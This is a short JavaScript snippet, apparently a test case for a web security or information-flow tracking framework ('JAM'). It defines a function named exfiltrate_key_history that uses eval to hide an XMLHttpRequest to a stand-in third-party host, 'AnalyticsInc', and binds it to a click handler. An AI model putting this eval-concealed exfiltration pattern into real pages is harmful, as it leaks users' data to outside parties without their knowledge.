
JAM.startProfile('load');
function exfiltrate_key_history(){var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval1", true);xmlhttp.send(null);';JAM.call(eval,null,[exp])}JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
